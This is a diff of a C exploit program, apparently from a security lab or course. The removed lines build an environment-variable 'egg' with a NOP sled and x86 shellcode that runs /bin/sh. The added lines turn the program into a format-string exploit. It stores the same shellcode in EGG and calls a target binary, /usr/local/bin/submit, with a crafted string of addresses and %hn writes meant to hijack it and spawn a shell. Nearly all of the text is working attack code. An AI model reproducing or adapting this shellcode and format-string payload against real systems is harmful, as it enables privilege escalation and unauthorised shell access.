@@ -1,40 +1,30 @@
 #include <stdlib.h>
 #include <stdio.h>
 
-#define DEFAULT_BUFFER_SIZE            2060
-#define NOP                            0x90
+#define TARGET      "/usr/local/bin/submit"
+#define GETEGG              "/share/getegg"
 
-char shellcode[] =
+char egg[] =
+  "EGG="
   "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
   "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
   "\x80\xe8\xdc\xff\xff\xff/bin/sh";
 
+char format[] =
+  "\xf8\xa1\x04\x08\xfa\xa1\x04\x08"
+  "%057264x%111$hn%0008199x%112$hn";
+
 void main(int argc, char *argv[]) {
-  char *buff, *ptr;
-  int bsize=DEFAULT_BUFFER_SIZE;
-  int i;
+  char *args[3];
+  char *env[2];
 
-  if (argc > 1) bsize  = atoi(argv[1]);
+  args[0] = TARGET;
+  args[1] = format;
+  args[2] = NULL;
 
-  if (!(buff = malloc(bsize))) {
-    printf("Can't allocate memory.\n");
-    exit(0);
-  }
+  env[0] = egg;
+  env[1] = NULL;
 
-  ptr = buff;
-
-  for (i = 0; i < bsize/2; i++)
-    buff[i] = NOP;
-
-  ptr = buff + ((bsize/2) - (strlen(shellcode)/2));
-  for (i = 0; i < strlen(shellcode); i++)
-    *(ptr++) = shellcode[i];
-
-  buff[bsize - 1] = '\0';
-
-  setenv("EGG", buff, 1);
-  printf("EGG Address: %p\n", getenv("EGG"));
-  system("bash");
-
+  execve(args[0], args, env);
   exit(0);
 }
